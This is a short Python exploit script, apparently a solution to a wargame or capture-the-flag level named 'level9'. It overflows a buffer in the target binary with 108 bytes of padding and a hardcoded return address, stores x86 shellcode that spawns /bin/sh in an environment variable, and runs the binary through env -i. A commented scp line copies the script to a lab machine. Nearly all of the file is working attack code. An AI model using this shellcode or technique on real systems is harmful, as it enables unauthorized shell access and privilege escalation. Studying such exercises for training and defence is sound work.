#!/usr/bin/python

import struct
import os

PADDING = "A" * 108;
CODE_ADDRESS = struct.pack("I", 0xbfffff9f);
ABS_ADDRESS = struct.pack("I", 0xbfffff95);
SHELLCODE="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

################################################################################
### TOOLS
################################################################################

# scp -P 4242 exploit.py level9@10.11.200.203:/tmp/9.py

################################################################################
### CLASS
################################################################################

class Payload:
    def __init__(self, path, target_pwd, target_name):
        self.fd = os.open(path, os.O_RDWR | os.O_CREAT | os.O_TRUNC);
        self.path = path;
        self.target_pwd = target_pwd;
        self.target_name = target_name;
        self.payload = "";

    def generate(self):
        os.write(self.fd, self.payload + "\n");

    def run(self):
        self.env = "env -i ABS='{0}' CODE='{1}' PWD='{2}' SHELL='/bin/bash' SHLVL=0".format(CODE_ADDRESS, SHELLCODE, self.target_pwd);

        os.system("{0} {1}/{2} {3}".format(self.env, self.target_pwd, self.target_name, self.payload));

    def __del__(self):
        os.close(self.fd);
        os.remove(self.path);

################################################################################
### PUBLIC FUNCTION
################################################################################

def main():
    p = Payload("/tmp/file", "/home/user/level9", "level9");

    p.payload += PADDING;
    p.payload += ABS_ADDRESS;

    p.run();

if __name__ == "__main__":
	main()
